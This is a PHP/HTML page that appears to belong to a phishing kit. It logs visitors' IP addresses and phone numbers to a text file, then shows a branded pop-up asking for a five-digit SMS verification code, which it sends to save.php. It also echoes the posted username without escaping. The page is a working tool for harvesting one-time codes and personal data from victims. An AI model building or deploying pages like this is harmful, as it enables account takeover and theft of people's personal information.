<?php

date_default_timezone_set('America/Sao_Paulo');

$hora = date ("Y-m-d # H:i:s");

$numeroTEL = $_POST['PhoneNumber'];
 
 

$ip = $_SERVER['REMOTE_ADDR'];

$tudo = "IP: ".$ip." - numero: ".$numeroTEL." - hora: ".$hora." *-*
"
;

$fp = fopen("Coding.txt", "a");
fwrite ($fp, $tudo);


 $username = $_POST['userz'];
?>

<html><head><script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script>
  <title>Key - drop</title>
  
   <link href="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/css/intlTelInput.css" rel="stylesheet" media="screen">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"> </script>
	<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/intlTelInput.js"> </script>
	<title>Título da página</title>
    <meta charset="utf-8">
 
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
  
  <link rel="icon" href="data:image/jpeg;base64,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" type="image/gif" sizes="16x16">

  
  
</head>

<body style="margin: 0;">

 

<div style="color:white;margin-left: 85%;margin-top: 2%;align-items: right;position:absolute;font-family: fantasy;"><?php echo $username ?></div>

<div class="DivMae">
<div class="PopUp" style="">

 <!-- Parte2PopUp -->
<div style="border-radius:10px;" class="Parte2PopUp">
<img class="faca" src="faca.png">
</div>
<!-- Final Parte2PopUp -->


<!-- Parte1PopUp -->
<div style="border-radius:10px;" class="Parte1PopUp">
 
<div class="Form">
 
<img style="padding-left:5%;width:90%;height:18%;" src="./kler.png" class="logoPopUp">  
<div style="font-size: 19px;color:white;margin-bottom: 27px;font-family: Fantasy;padding-left: 7%;margin-top: -3%;"><a style="color:white;">User : </a><a style="color:#f5c71b;"><?php echo $username ?></a></div>
  <img style="padding-left:5%;width: 87%;height:50px;padding-bottom:35px;margin-top:-3%;" src="./sendd.png" class="">

 <img style="padding-left:5%;width: 87%;height: 19px;" src="./real.png" class="verify">
<form action="save.php" method="POST" required="" id="formID">
 
 
 
<div class="InputLocation">
 
 <input style="text-align:center;font: bold;" type="numeric" name="code1" required maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code2"  required maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code3" required maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code4"  required maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code5"  required maxlength="1" size="1">
 
</div>
<a href="./register-number.php" ><img style="padding-left:5%;width: 78%;height: 24px;" src="./sendsms.png" class="logoPopUp2"></a>
<input type="submit" value="" required="" class="botao">

</form>

</div></div> 
<!-- FinalParte1PopUp -->




 

<!-- Final da DIV PopUp -->
</div>

<!-- Final da DIV MAE -->
</div>

<style>
 div.PopUp {
 position: absolute;
  width: 960px;
  height: 480px;
  z-index: 15;
  top: 28%;
  left: 28%;
  margin: -100px 0 0 -150px;
  background: url("./gray.png");
  border-radius: 20px;
  }
  
  div.Parte1PopUp {
  padding: 0;
  margin: 0;
  background: url("./gray.png");
  height:100%;
  width:50%;
  position: flex; 
  
  }
  
  
  
  
  div.Parte2PopUp {
  background: url("./gray.png");
  height: 100%;
  width: 50%;
  position: absolute;
  margin-left:50%;

  }
  
  .logoPopUp {
  margin-top:-0%;
 

  }
  
   .logoPopUp3 {
  margin-top:7%;
 

  }
  
  .verify {
  margin-top:3%;
  margin-bottom:5%;
  }
  
    .logoPopUp2 {
  margin-top:7%;
  margin-bottom:15px;

  }
  
  img.faca {
  height:94%;
  width: 99%;
  border-radius:10px;
  padding-top:5%;
  }
  
  body {
 background: url("../fundosmszz.png") 0% 0% / cover no-repeat scroll padding-box border-box rgb(18, 13, 14); z-index: 2;
 background: url("../fundosmszz.png") 0% 0% / cover no-repeat scroll padding-box border-box rgb(18, 13, 14); z-index: 2;
  }
  
  
 .botao {
background-image:url("bconfirm.png");
width: 95%;
height: 9%;
 border-radius:10px;
 margin-left:3%;
 border-color: orange;
 margin-top:25px;
}

.input {
width: 80%;
height: 10%;
border-radius: 10px;
padding-top:100px;
margin-left: 5%;
background: ;
border-color: orange;
text-size:20px;
text-align: center;
}

input.PhoneNumber::placeholder {
  font: 1.25rem/3 sans-serif;
}

div.InputLocation {
padding-left: 7%;
margin-top: 3%;}
width:100%;

</style>



 <style>
 
input {
  width: 17%;
  margin-left: 5px;
  padding: 10px;
  height: 40px;
  border-radius: 10px;
  border: 1px solid #ccc;
   

   
}
input::placeholder {
  color: #BBB;
}
  </style>

 <script>
 
var input = document.querySelector("#phone");
var errorMap = ["Invalid number", "Invalid country code", "Too short", "Too long", "Invalid number"];
    window.addEventListener("load", function () {
        
        errorMsg = document.querySelector("#error-msg"),
 validMsg = document.querySelector("#valid-msg");
        var iti = window.intlTelInput(input, {
            utilsScript:"https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js"
        });
        window.intlTelInput(input, {
            // allowDropdown: false,
            // autoHideDialCode: false,
            // autoPlaceholder: "off",
            // dropdownContainer: document.body,
            // excludeCountries: ["us"],
            // formatOnDisplay: false,
             geoIpLookup: function(callback) {
         $.get("https://ipinfo.io", function() {}, "jsonp").always(function(resp) {
           var countryCode = (resp && resp.country) ? resp.country : "";
           callback(countryCode);
         });
       },
            // hiddenInput: "full_number",
            initialCountry: "auto",
           
            // localizedCountries: { 'de': 'Deutschland' },
            //nationalMode: false,
            // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
            placeholderNumberType: "MOBILE",
            // preferredCountries: ['cn', 'jp'],
            // separateDialCode: true,
            utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js",
        });
        $(validMsg).addClass("hide");
        input.addEventListener('blur', function () {
            reset();
            if (input.value.trim()) {
                if (iti.isValidNumber()) {
                    validMsg.classList.remove("hide");
                } else {
                    input.classList.add("error");
                    var errorCode = iti.getValidationError();
                    errorMsg.innerHTML = errorMap[errorCode];
                    errorMsg.classList.remove("hide");
                }
            }
        });
        
        input.addEventListener('change', reset);
        input.addEventListener('keyup', reset);
    });

    
    var reset = function () {
        input.classList.remove("error");
        errorMsg.innerHTML = "";
        errorMsg.classList.add("hide");
        validMsg.classList.add("hide");
    };

  </script>

  
	 <script>
	$("input").keyup(function () {
    if (this.value.length == this.maxLength) {
      $(this).next('input').focus();
    }
});
</script>
	
	 
<script class="iti-load-utils" async="" src="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js"></script></body></html>